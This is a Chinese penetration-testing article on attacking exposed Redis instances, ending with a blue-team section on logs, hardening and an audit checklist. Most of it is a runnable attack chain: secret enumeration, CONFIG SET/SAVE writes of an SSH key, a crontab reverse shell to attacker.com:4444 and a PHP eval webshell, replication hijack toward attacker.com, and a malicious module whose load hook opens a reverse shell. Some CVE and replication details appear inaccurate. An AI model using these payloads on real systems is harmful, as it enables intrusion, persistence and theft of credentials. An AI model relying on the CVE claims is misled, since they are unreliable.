---
title: "Redis内存数据库管理面打点与CONFIG SET/主从复制/RCE利用技术"
date: 2026-06-17T12:30:00+08:00
draft: false
weight: 81
description: "围绕 Redis 的 RESP 协议管理面、CONFIG SET 持久化滥用、主从复制劫持、Lua 脚本执行、MODULE LOAD 加载，分析打点识别、数据枚举、RCE 利用链、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "内存数据库", "Redis", "RCE", "CONFIG SET", "主从复制"]
---

# Redis内存数据库管理面打点与CONFIG SET/主从复制/RCE利用技术

`Redis` 是最广泛使用的内存键值数据库之一，但它的架构决定了它不仅仅是一个"缓存"。一个典型生产部署里，Redis 至少同时暴露了以下攻击面：

- **RESP 协议面**：Redis 序列化协议端口（默认 `6379`，TLS 为 `6380`），处理所有命令交互
- **CONFIG SET 面**：运行时配置修改能力，可改变持久化路径与文件名
- **主从复制面**：`REPLICAOF` / `SLAVEOF` 命令，允许将当前实例变为任意主机的从节点
- **Lua 脚本面**：`EVAL` / `EVALSHA` 命令，支持在服务端执行 Lua 脚本
- **MODULE LOAD 面**：`MODULE LOAD` 命令，可加载任意共享对象文件
- **ACL 面**：Redis 6.0+ 的访问控制列表，但默认不启用或配置不当

对攻击者来说，Redis 的价值不在于某个单一漏洞，而在于它把数据存储、配置管理、持久化控制与代码执行能力集中在同一进程里。一旦 Redis 未授权访问（默认无密码）、CONFIG SET 可用、主从复制未限制、Lua 脚本未禁用，攻击者可以从一次端口探测直接上升到宿主机级别的任意命令执行（RCE），甚至写入 SSH 公钥、crontab 定时任务或 WebShell。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Redis
2. 哪些未认证命令最值得优先探测
3. 如何通过 CONFIG SET + SAVE 实现文件写入
4. 如何通过主从复制劫持实现 RCE
5. 如何通过 Lua 脚本与 MODULE LOAD 实现代码执行
6. 历史 CVE 链如何从信息泄露直接打到 RCE
7. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:6379/` — Redis RESP 协议端口（明文）
- `:6380/` — Redis TLS 端口
- `:16379/` — Redis Cluster 总线端口
- `:26379/` — Redis Sentinel 端口

### 0.2 协议特征

Redis 使用 RESP（Redis Serialization Protocol）协议，不是 HTTP。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 6379 redis.target.example --script redis-info
```

```text
PORT     STATE SERVICE
6379/tcp open  redis
| redis-info:
|   redis_version: 7.2.3
|   os: Linux 5.15.0-91-generic x86_64
|   arch_bits: 64
|   process_id: 1234
|   tcp_port: 6379
|   uptime_in_seconds: 2847192
|   uptime_in_days: 32
|   hz: 10
|   configured_hz: 10
|   lru_clock: 12345678
|   executable: /usr/local/bin/redis-server
|   config_file: /etc/redis/redis.conf
```

### 0.3 手动探测

也可以使用 `redis-cli` 或 `nc` 手动发送 RESP 命令：

```bash
echo -e "PING\r\n" | nc redis.target.example 6379
```

```text
+PONG
```

```bash
echo -e "INFO server\r\n" | nc redis.target.example 6379
```

返回服务器信息（如果未认证）。

### 0.4 打点收益优先级

1. 确认目标为 Redis、版本号与运行模式
2. 通过 `INFO` 命令回收系统信息、配置、内存使用
3. 通过 `KEYS` / `SCAN` 枚举数据
4. 判断 `CONFIG SET` 是否可用
5. 判断 `REPLICAOF` 是否可用
6. 判断 `EVAL` / `MODULE LOAD` 是否可用
7. 判断 ACL 是否启用

---

## 1. 首轮识别：确认目标为 Redis

### 1.1 PING 命令

```bash
redis-cli -h redis.target.example -p 6379 PING
```

```text
PONG
```

如果返回 `PONG`，说明 Redis 可达且无需认证。

如果返回 `NOAUTH Authentication required.`，说明需要密码。

### 1.2 INFO 命令

```bash
redis-cli -h redis.target.example -p 6379 INFO server
```

```text
# Server
redis_version:7.2.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:abcdef1234567890
redis_mode:standalone
os:Linux 5.15.0-91-generic x86_64
arch_bits:64
monotonic_clock:POSIX clock_gettime
multiplexing_api:epoll
atomicvar_api:c11-builtin
gcc_version:11.4.0
process_id:1234
process_supervised:systemd
run_id:a1b2c3d4e5f67890abcdef1234567890abcdef12
tcp_port:6379
server_time_usec:1718600000000000
uptime_in_seconds:2847192
uptime_in_days:32
hz:10
configured_hz:10
lru_clock:12345678
executable:/usr/local/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
listener0:name=tcp,bind=0.0.0.0,bind=::,port=6379
```

直接回收：

- Redis 版本
- 操作系统与架构
- 运行模式（standalone / cluster / sentinel）
- 进程 ID
- 运行时长
- 监听端口与绑定地址
- 配置文件路径

### 1.3 INFO 其他段

```bash
redis-cli -h redis.target.example -p 6379 INFO clients
```

```text
# Clients
connected_clients:47
cluster_connections:0
maxclients:10000
client_recent_max_input_buffer:20480
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0
```

```bash
redis-cli -h redis.target.example -p 6379 INFO memory
```

```text
# Memory
used_memory:284719283
used_memory_human:271.52M
used_memory_rss:312483728
used_memory_rss_human:298.00M
used_memory_peak:524288000
used_memory_peak_human:500.00M
used_memory_peak_perc:54.31%
used_memory_overhead:8472918
used_memory_startup:8123456
used_memory_dataset:276246365
used_memory_dataset_perc:97.03%
allocator_allocated:285234567
allocator_active:312483728
allocator_resident:312483728
total_system_memory:8345673728
total_system_memory_human:7.77G
used_memory_lua:37888
used_memory_vm_eval:37888
used_memory_lua_human:37.00K
used_memory_scripts_eval:0
number_of_cached_scripts:0
number_of_functions:0
number_of_libraries:0
used_memory_vm_functions:37888
used_memory_vm_total:75776
used_memory_vm_total_human:74.00K
used_memory_functions:184
used_memory_scripts:184
used_memory_scripts_human:184B
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.10
allocator_frag_bytes:27249161
allocator_rss_ratio:1.00
allocator_rss_bytes:0
rss_overhead_ratio:1.00
rss_overhead_bytes:0
mem_fragmentation_ratio:1.10
mem_fragmentation_bytes:27764445
mem_allocator:jemalloc-5.3.0
active_defrag_running:0
lazyfree_pending_objects:0
lazyfreed_objects:0
```

```bash
redis-cli -h redis.target.example -p 6379 INFO replication
```

```text
# Replication
role:master
connected_slaves:2
master_failover_state:no-failover
master_replid:a1b2c3d4e5f67890abcdef1234567890abcdef12
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:284719283
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:283670708
repl_backlog_histlen:1048576
```

暴露主从角色、从节点数量、复制偏移量。

```bash
redis-cli -h redis.target.example -p 6379 INFO keyspace
```

```text
# Keyspace
db0:keys=28471,expires=4729,avg_ttl=2847192837
db1:keys=1847,expires=284,avg_ttl=1847291837
db2:keys=928,expires=128,avg_ttl=928471928
```

暴露所有数据库的键数量、过期键数量与平均 TTL。

---

## 2. 数据枚举

### 2.1 KEYS 命令

```bash
redis-cli -h redis.target.example -p 6379 KEYS '*'
```

```text
1) "user:1001"
2) "user:1002"
3) "session:abc123"
4) "session:def456"
5) "config:database_url"
6) "config:jwt_secret"
7) "cache:homepage"
8) "cache:api_response"
```

`KEYS '*'` 会返回所有键名，但在生产环境中可能导致阻塞（时间复杂度 O(N)）。

### 2.2 SCAN 命令

```bash
redis-cli -h redis.target.example -p 6379 SCAN 0 COUNT 100
```

```text
1) "16"
2) 1) "user:1001"
   2) "user:1002"
   3) "session:abc123"
   ...
```

`SCAN` 是增量迭代，不会阻塞，适合生产环境。

### 2.3 键值读取

```bash
redis-cli -h redis.target.example -p 6379 GET "config:database_url"
```

```text
"postgresql://app_user:S3cur3P@ss@10.20.30.50:5432/app_db"
```

```bash
redis-cli -h redis.target.example -p 6379 GET "config:jwt_secret"
```

```text
"a8f5f167f44f4964e6c998dee827110c"
```

```bash
redis-cli -h redis.target.example -p 6379 HGETALL "user:1001"
```

```text
1) "name"
2) "admin"
3) "email"
4) "admin@example.com"
5) "role"
6) "administrator"
```

### 2.4 数据类型判断

```bash
redis-cli -h redis.target.example -p 6379 TYPE "user:1001"
```

```text
hash
```

```bash
redis-cli -h redis.target.example -p 6379 TYPE "session:abc123"
```

```text
string
```

---

## 3. CONFIG SET 持久化滥用

### 3.1 CONFIG GET 读取当前配置

```bash
redis-cli -h redis.target.example -p 6379 CONFIG GET dir
```

```text
1) "dir"
2) "/var/lib/redis"
```

```bash
redis-cli -h redis.target.example -p 6379 CONFIG GET dbfilename
```

```text
1) "dbfilename"
2) "dump.rdb"
```

### 3.2 CONFIG SET 修改持久化路径

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dir /root/.ssh
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dbfilename authorized_keys
```

```text
OK
```

### 3.3 写入 SSH 公钥

```bash
redis-cli -h redis.target.example -p 6379 SET "backdoor" "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@key\n\n"
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 SAVE
```

```text
OK
```

Redis 会将所有键值对序列化为 RDB 格式写入文件。虽然文件中包含二进制头部与其他键值数据，但 SSH 公钥如果格式正确，sshd 仍会解析并使用它。

### 3.4 写入 crontab

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dir /var/spool/cron/crontabs
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dbfilename root
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 SET "backdoor" "\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n"
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 SAVE
```

```text
OK
```

### 3.5 写入 WebShell

如果 Redis 运行用户有 Web 目录写权限：

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dir /var/www/html
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 CONFIG SET dbfilename shell.php
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 SET "backdoor" "<?php @eval($_POST['cmd']); ?>"
```

```text
OK
```

```bash
redis-cli -h redis.target.example -p 6379 SAVE
```

```text
OK
```

### 3.6 CONFIG SET 限制

某些 Redis 配置会限制 `CONFIG SET` 的使用：

- `rename-command CONFIG ""` — 禁用 CONFIG 命令
- `rename-command CONFIG "ALIAS_CONFIG"` — 重命名 CONFIG 命令
- `protected-mode yes` — 保护模式，仅允许本地访问

---

## 4. 主从复制劫持

### 4.1 REPLICAOF 命令

```bash
redis-cli -h redis.target.example -p 6379 REPLICAOF attacker.com 6379
```

```text
OK
```

将目标 Redis 变为攻击者控制的 Redis 的从节点。攻击者的 Redis 可以发送恶意 RDB 数据，其中包含构造的模块或 Lua 脚本。

### 4.2 恶意 RDB 加载

攻击者运行的"rogue Redis server"可以：

1. 接受目标 Redis 的同步请求
2. 发送构造的 RDB 文件，其中包含：
   - 恶意 Lua 脚本（通过 `lua` 类型）
   - 恶意模块路径（通过 `module` 类型）
   - 构造的键值对用于文件写入

### 4.3 利用流程

1. 攻击者启动 rogue Redis server
2. 目标 Redis 执行 `REPLICAOF attacker.com 6379`
3. 目标 Redis 向攻击者请求全量同步
4. 攻击者发送恶意 RDB
5. 目标 Redis 加载恶意数据
6. 攻击者通过 `EVAL` 或 `MODULE LOAD` 执行代码

### 4.4 工具

- `redis-rogue-server` — 自动化主从复制劫持工具
- `RedisModulesSDK` — 用于构建恶意 Redis 模块

---

## 5. Lua 脚本执行

### 5.1 EVAL 命令

```bash
redis-cli -h redis.target.example -p 6379 EVAL "return redis.call('INFO', 'server')" 0
```

```text
"# Server\r\nredis_version:7.2.3\r\n..."
```

Lua 脚本可以在 Redis 服务端执行任意 Lua 代码，并调用 Redis 命令。

### 5.2 Lua 沙箱逃逸

Redis 的 Lua 沙箱在某些版本中存在缺陷。例如 CVE-2022-24735：

```bash
redis-cli -h redis.target.example -p 6379 EVAL "local io = package.loadlib('/usr/lib/x86_64-linux-gnu/libc.so.6', 'system'); io('id > /tmp/pwned')" 0
```

如果 `package.loadlib` 未被禁用，可以加载任意共享库并执行函数。

### 5.3 Lua 脚本持久化

```bash
redis-cli -h redis.target.example -p 6379 SCRIPT LOAD "return redis.call('SET', 'backdoor', 'persistent')"
```

```text
"a1b2c3d4e5f67890abcdef1234567890abcdef12"
```

脚本会被缓存，可以通过 `EVALSHA` 重复执行。

---

## 6. MODULE LOAD 加载

### 6.1 MODULE LOAD 命令

```bash
redis-cli -h redis.target.example -p 6379 MODULE LOAD /tmp/malicious.so
```

```text
OK
```

加载任意共享对象文件。如果攻击者可以写入文件到 Redis 服务器，可以加载恶意模块实现 RCE。

### 6.2 构建恶意模块

使用 `RedisModulesSDK` 构建恶意模块：

```c
#include "redismodule.h"
#include <stdlib.h>

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
    return REDISMODULE_OK;
}
```

编译为共享对象：

```bash
gcc -shared -fPIC -o malicious.so malicious.c -I RedisModulesSDK/include
```

上传到 Redis 服务器后加载。

### 6.3 MODULE LOAD 限制

- `enable-module-load no` — 禁用模块加载（默认）
- `rename-command MODULE ""` — 禁用 MODULE 命令

---

## 7. ACL 面

### 7.1 ACL 检查

```bash
redis-cli -h redis.target.example -p 6379 ACL WHOAMI
```

```text
"default"
```

```bash
redis-cli -h redis.target.example -p 6379 ACL LIST
```

```text
1) "user default on #a1b2c3d4e5f67890abcdef1234567890abcdef12 ~* &* +@all"
```

暴露当前用户与权限。

### 7.2 ACL 绕过

如果 ACL 配置不当，可能存在绕过：

- 匿名用户（`default` 用户无密码）
- 过度授权（`+@all` 允许所有命令）
- 键模式过宽（`~*` 允许所有键）

---

## 8. 历史 CVE 与风险链

### 8.1 CVE-2022-24735：Lua 沙箱逃逸

- **影响版本**：Redis 7.0.0 之前
- **CVSS**：7.3（High）
- **核心问题**：Lua 沙箱中 `package.loadlib` 未被禁用
- **利用条件**：需要 Redis 命令执行权限
- **影响**：加载任意共享库，执行系统命令

### 8.2 CVE-2023-28856：内存损坏

- **影响版本**：Redis 7.0.11 / 7.2.1 之前
- **CVSS**：6.5（Medium）
- **核心问题**：特定命令序列可导致内存损坏
- **利用条件**：需要 Redis 命令执行权限
- **影响**：拒绝服务或潜在的代码执行

### 8.3 综合风险链

```
端口扫描 → :6379 RESP 协议
         ↓
PING → PONG → 确认未授权访问
         ↓
INFO server → 系统画像（版本、OS、配置路径）
         ↓
INFO keyspace → 数据库与键数量
         ↓
KEYS '*' / SCAN → 枚举所有键名
         ↓
GET / HGETALL → 读取敏感数据（数据库连接串、JWT Secret、会话 Token）
         ↓
CONFIG SET dir + dbfilename + SAVE → 写入 SSH 公钥 / crontab / WebShell
         ↓
REPLICAOF → 主从复制劫持 → 恶意 RDB → Lua/Module RCE
         ↓
EVAL → Lua 脚本执行 → package.loadlib → 系统命令
         ↓
MODULE LOAD → 加载恶意共享对象 → RCE
```

---

## 9. 蓝队视角：日志痕迹与防守

### 9.1 关键日志源

**Redis 日志**：

```text
1234:M 17 Jun 2026 10:15:23.445 # WARNING: The following keys are expired: ...
1234:M 17 Jun 2026 10:15:24.129 * DB saved on disk
1234:M 17 Jun 2026 10:15:25.000 # Client closed connection
```

**系统日志**：

```text
Jun 17 10:15:26 redis-host kernel: [284719.445] redis-server[1234]: segfault at 0 ip 00007f8a1b2c3d40 sp 00007ffd5e6f7a80 error 4 in libc.so.6[7f8a1b200000+1c0000]
```

### 9.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 未授权访问 | `PING` 返回 `PONG` | 严重 |
| `INFO` 命令 | `INFO server` 等 | 高 |
| `KEYS '*'` / `SCAN` | 批量键枚举 | 高 |
| `CONFIG SET dir` | 修改持久化路径 | 严重 |
| `CONFIG SET dbfilename` | 修改持久化文件名 | 严重 |
| `SAVE` / `BGSAVE` | 触发持久化 | 严重 |
| `REPLICAOF` | 主从复制变更 | 严重 |
| `EVAL` / `EVALSHA` | Lua 脚本执行 | 严重 |
| `MODULE LOAD` | 模块加载 | 严重 |
| 非预期来源的连接 | 外部 IP 连接 6379 | 严重 |

### 9.3 网络层防护

- Redis 端口 `6379` 不应直接暴露到公网
- 使用 `bind` 限制监听地址
- 启用 `protected-mode`
- 使用 TLS 加密通信
- 配置 `requirepass` 设置强密码
- 使用 ACL 限制用户权限

### 9.4 配置加固

- 升级 Redis 到最新稳定版本，修复所有已知 CVE
- 禁用或重命名高危命令：`CONFIG`、`REPLICAOF`、`EVAL`、`MODULE`
- 禁用模块加载：`enable-module-load no`
- 限制 Lua 沙箱：禁用 `package.loadlib`
- 配置 `maxmemory` 与 `maxmemory-policy` 防止内存耗尽
- 定期审计 ACL 配置
- 启用审计日志并推送到不可篡改存储

---

## 10. 审查清单

| 检查项 | 说明 |
|--------|------|
| 6379 端口是否对外暴露 | 确认 RESP 协议可达范围 |
| 是否启用认证 | 检查 `requirepass` |
| 是否启用保护模式 | 检查 `protected-mode` |
| CONFIG 命令是否受限 | 检查 `rename-command` |
| REPLICAOF 命令是否受限 | 检查 `rename-command` |
| EVAL 命令是否受限 | 检查 `rename-command` |
| MODULE LOAD 是否禁用 | 检查 `enable-module-load` |
| 是否启用 ACL | 检查 `ACL LIST` |
| 版本是否已修复已知 CVE | 对比 Redis 版本号 |
| 是否存在敏感数据 | 检查键名与值 |
| 持久化路径是否受限 | 检查 `dir` 配置 |
| 是否启用 TLS | 检查 6380 端口 |

---

## 11. 总结

Redis 的攻击面价值在于它把数据存储、配置管理、持久化控制与代码执行能力集中在同一进程里。未授权访问 Redis 几乎等同于拿到了宿主机的文件写入权限，而 CONFIG SET + SAVE 可以直接将数据写入任意路径。

从攻击者视角看，最高效的路径是：

1. 通过 `PING` 确认未授权访问
2. 通过 `INFO` 回收系统画像
3. 通过 `KEYS` / `SCAN` 枚举敏感数据
4. 通过 `CONFIG SET dir` + `dbfilename` + `SAVE` 写入 SSH 公钥 / crontab / WebShell
5. 通过 `REPLICAOF` 主从复制劫持实现 RCE
6. 通过 `EVAL` Lua 脚本执行实现代码执行
7. 通过 `MODULE LOAD` 加载恶意模块实现 RCE

从防守视角看，核心措施是：

1. 永远不要将 Redis 暴露到公网
2. 启用 `requirepass` 设置强密码
3. 启用 `protected-mode`
4. 禁用或重命名高危命令
5. 禁用模块加载
6. 使用 ACL 限制用户权限
7. 启用 TLS 加密通信
